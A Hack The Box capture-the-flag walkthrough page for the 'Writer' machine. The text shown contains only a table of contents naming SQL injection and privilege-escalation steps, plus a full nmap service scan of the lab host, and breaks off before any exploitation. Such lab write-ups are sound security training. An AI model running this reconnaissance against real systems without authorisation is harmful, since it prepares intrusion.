<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.lug.ustc.edu.cn/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}}</script><script src="/js/config.js"></script>

    <meta name="description" content="introduceOS:	 LinuxDifficulty:	MediumPoints:	30Release:	31 Jul 2021IP:	10.10.11.101">
<meta property="og:type" content="article">
<meta property="og:title" content="Hack-The-Box-walkthrough[writer]">
<meta property="og:url" content="https://fdlucifer.github.io/2021/08/06/writer/index.html">
<meta property="og:site_name" content="fdvoid0&#39;s blog">
<meta property="og:description" content="introduceOS:	 LinuxDifficulty:	MediumPoints:	30Release:	31 Jul 2021IP:	10.10.11.101">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2046.jpg">
<meta property="og:image" content="http://www.hackthebox.eu/badge/image/235857">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2047.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2048.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2049.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2050.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2051.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2052.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2053.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2054.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2055.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2056.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2057.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2058.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2059.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2060.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2061.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2062.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2063.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2064.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2065.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2066.jpg">
<meta property="article:published_time" content="2021-08-06T06:27:01.000Z">
<meta property="article:modified_time" content="2021-12-12T07:43:23.783Z">
<meta property="article:author" content="fdvoid0">
<meta property="article:tag" content="HackTheBox靶机练习">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2046.jpg">


<link rel="canonical" href="https://fdlucifer.github.io/2021/08/06/writer/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2021/08/06/writer/","path":"2021/08/06/writer/","title":"Hack-The-Box-walkthrough[writer]"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Hack-The-Box-walkthrough[writer] | fdvoid0's blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="fdvoid0's blog" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">fdvoid0's blog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">by fdvoid0</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">43</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">42</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">206</span></a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#introduce"><span class="nav-number">1.</span> <span class="nav-text">introduce</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Enumeration"><span class="nav-number"></span> <span class="nav-text">Enumeration</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Nmap"><span class="nav-number">1.</span> <span class="nav-text">Nmap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SMB"><span class="nav-number">2.</span> <span class="nav-text">SMB</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Enum4linux"><span class="nav-number">2.1.</span> <span class="nav-text">Enum4linux</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#smbmap"><span class="nav-number">2.2.</span> <span class="nav-text">smbmap</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB"><span class="nav-number">3.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Visiting-Website"><span class="nav-number">3.1.</span> <span class="nav-text">Visiting Website</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Directory-Fuzzing"><span class="nav-number">3.2.</span> <span class="nav-text">Directory Fuzzing</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Crawling-through-the-directories"><span class="nav-number">3.3.</span> <span class="nav-text">Crawling through the directories</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Sql-Injection"><span class="nav-number">3.4.</span> <span class="nav-text">Sql-Injection</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Sqlmap"><span class="nav-number">3.5.</span> <span class="nav-text">Sqlmap</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Exploitation"><span class="nav-number"></span> <span class="nav-text">Exploitation</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Creating-fast-Working-SQL-query"><span class="nav-number">1.</span> <span class="nav-text">Creating fast Working SQL query</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#step-1-gt-terminiating-the-ongoin-query"><span class="nav-number">1.1.</span> <span class="nav-text">step 1 -&gt; terminiating the ongoin query</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#step-2-gt-Using-UNION-statement"><span class="nav-number">1.2.</span> <span class="nav-text">step 2  -&gt; Using UNION statement:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#step-3-gt-Adjusting-No-of-rows"><span class="nav-number">1.3.</span> <span class="nav-text">step 3 -&gt; Adjusting No. of rows.</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#step-4-gt-Which-column-to-inject-so-it-returns-the-output"><span class="nav-number">1.4.</span> <span class="nav-text">step 4 -&gt; Which column to inject so it returns the output.</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#step-5-gt-Terminate-the-query"><span class="nav-number">1.5.</span> <span class="nav-text">step 5 -&gt; Terminate the query</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Final-SQL-query"><span class="nav-number">2.</span> <span class="nav-text">Final SQL query</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#writer-wsgi"><span class="nav-number">2.1.</span> <span class="nav-text">writer.wsgi</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#init-py"><span class="nav-number">2.2.</span> <span class="nav-text">init.py</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Generating-file-with-malicious-name"><span class="nav-number">3.</span> <span class="nav-text">Generating file with malicious name</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Getting-user"><span class="nav-number"></span> <span class="nav-text">Getting user</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Enumeration-1"><span class="nav-number">1.</span> <span class="nav-text">Enumeration</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ss-tupln"><span class="nav-number">1.1.</span> <span class="nav-text">ss -tupln</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Kyle-to-John"><span class="nav-number"></span> <span class="nav-text">Kyle to John</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Enumeration-2"><span class="nav-number">1.</span> <span class="nav-text">Enumeration</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Pspy64"><span class="nav-number">1.1.</span> <span class="nav-text">Pspy64</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PrivESC"><span class="nav-number"></span> <span class="nav-text">PrivESC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Stabilizing-the-shell"><span class="nav-number">1.</span> <span class="nav-text">Stabilizing the shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Enumeration-3"><span class="nav-number">2.</span> <span class="nav-text">Enumeration</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploitation-1"><span class="nav-number">3.</span> <span class="nav-text">Exploitation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Summary-of-knowledge"><span class="nav-number">3.1.</span> <span class="nav-text">Summary of knowledge</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Contact-me"><span class="nav-number">3.2.</span> <span class="nav-text">Contact me</span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="fdvoid0"
      src="/images/blackhole.png">
  <p class="site-author-name" itemprop="name">fdvoid0</p>
  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">206</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">42</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">43</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="fa fa-stack-exchange fa-fw"></i>infosec.exchange</span>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
  </div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="Back to top">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
    <div class="sidebar-inner sidebar-blogroll">
      <div class="links-of-blogroll animated">
        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
          Links
        </div>
        <ul class="links-of-blogroll-list">
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
            </li>
        </ul>
      </div>
    </div>
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2021/08/06/writer/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/blackhole.png">
      <meta itemprop="name" content="fdvoid0">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="fdvoid0's blog">
      <meta itemprop="description" content="All things about infosec & ctf">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="Hack-The-Box-walkthrough[writer] | fdvoid0's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Hack-The-Box-walkthrough[writer]
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-08-06 14:27:01" itemprop="dateCreated datePublished" datetime="2021-08-06T14:27:01+08:00">2021-08-06</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2021-12-12 15:43:23" itemprop="dateModified" datetime="2021-12-12T15:43:23+08:00">2021-12-12</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/HackTheBox-walkthrough/" itemprop="url" rel="index"><span itemprop="name">HackTheBox walkthrough</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">Views: </span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>12k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>42 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h2 id="introduce"><a href="#introduce" class="headerlink" title="introduce"></a>introduce</h2><p>OS:	 Linux<br>Difficulty:	Medium<br>Points:	30<br>Release:	31 Jul 2021<br>IP:	10.10.11.101</p>
<ul>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2046.jpg"></p>
</li>
<li><p><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></p>
</li>
</ul>
<span id="more"></span>

<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.91 scan initiated Sun Aug  1 01:58:59 2021 as: nmap -vvv -p 22,80,139,445 -A -v -oN intial.nmap 10.10.11.101</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.101</span><br><span class="line">Host is up, received syn-ack (0.13s latency).</span><br><span class="line">Scanned at 2021-08-01 01:59:01 EDT <span class="keyword">for</span> 17s</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE     REASON  VERSION</span><br><span class="line">22/tcp  open  ssh         syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA)</span><br><span class="line">| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCwAA7IblnSMXNfqjkkoT+PAk2SPYBRL5gy0K0FQ2XbFGuPk6ImjJLrb0BF6qw3hU/I2V9ARRnn2SvHlz1+lLB0Ie9wkvH1gZfnUBd5X2sOS3vCzYJOBoD+yzJat40YmKx3NLjYCzkMd/KyTGGIH0cdlnROO6eJdnJN1QYMsrM4+QkkrQHtgz5KAk/aE18+1e5toWK1Px+KtVjvPWiD7mTb4J99f79L/5CCI9nUfmjeB8EU9qe3igUQ3zCGVFGUNTA9Vva99kh3SC6YjBe8+9ipFSZFVSqaJoJpZF83Oy2BEPWEb6lgo3cx7FwGH24nT833Y4Urk294/5ym8F3JFxo/FCgtjuYwp5Im1j9oVOGSnECKfC785zZiSu+ubdnxDjvbuRgW34DsKZpbtVvwxs8R/VNE3bSldVLmz5gCwP0Dfaop+Tbn7MW8OJWL6hEQqNiLw3cSBpzPId/EIMO7TMfqVXTfkMtD1yiIlafd3ianGLu+VUpJ3Bg8jk/COUOHj/M=</span><br><span class="line">|   256 10:04:79:7a:29:74:db:28:f9:ff:af:68:<span class="built_in">df</span>:f1:3f:34 (ECDSA)</span><br><span class="line">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBD+ZKRtm6JRYjPO1v8n2nR/cGDBj0Oaydm1VE6rUnvyI6bxfnPCaRjvxDrV3eW5rRXbK/ybC0k5WHtQ9iWogmAU=</span><br><span class="line">|   256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519)</span><br><span class="line">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBaCZ4ALrn0m103XaA+e+YPrTO2f1hK8mAD5kUxJ7O9L</span><br><span class="line">80/tcp  open  http        syn-ack Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: HEAD GET OPTIONS</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Story Bank | Writer.HTB</span><br><span class="line">139/tcp open  netbios-ssn syn-ack Samba smbd 4.6.2</span><br><span class="line">445/tcp open  netbios-ssn syn-ack Samba smbd 4.6.2</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: 5s</span><br><span class="line">| nbstat: NetBIOS name: WRITER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| Names:</span><br><span class="line">|   WRITER&lt;00&gt;           Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|   WRITER&lt;03&gt;           Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|   WRITER&lt;20&gt;           Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|   \x01\x02__MSBROWSE__\x02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;</span><br><span class="line">|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;</span><br><span class="line">|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|   WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;</span><br><span class="line">| Statistics:</span><br><span class="line">|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">| p2p-conficker: </span><br><span class="line">|   Checking <span class="keyword">for</span> Conficker.C or higher...</span><br><span class="line">|   Check 1 (port 52234/tcp): CLEAN (Couldn<span class="string">&#x27;t connect)</span></span><br><span class="line"><span class="string">|   Check 2 (port 36309/tcp): CLEAN (Couldn&#x27;</span>t connect)</span><br><span class="line">|   Check 3 (port 34246/udp): CLEAN (Failed to receive data)</span><br><span class="line">|   Check 4 (port 42160/udp): CLEAN (Failed to receive data)</span><br><span class="line">|_  0/4 checks are positive: Host is CLEAN or ports are blocked</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2021-08-01T05:59:20</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="comment"># Nmap done at Sun Aug  1 01:59:18 2021 -- 1 IP address (1 host up) scanned in 19.34 seconds</span></span><br></pre></td></tr></table></figure>

<p>Looks like we have SSH,SMB and WEB. So let’s start with SMB</p>
